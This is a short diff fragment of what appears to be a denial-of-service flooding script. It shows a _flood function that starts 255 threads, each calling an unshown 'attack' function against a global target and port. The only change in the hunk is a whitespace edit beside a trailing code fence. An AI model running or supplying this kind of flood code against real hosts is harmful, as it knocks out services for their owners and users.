@@ -21,4 +21,4 @@ def _flood():
     global TARGET,PORT
     for i in range(0,255):
         Thread(target=attack,args=(TARGET,int(PORT))).start()
-_flood()```
+_flood() ```
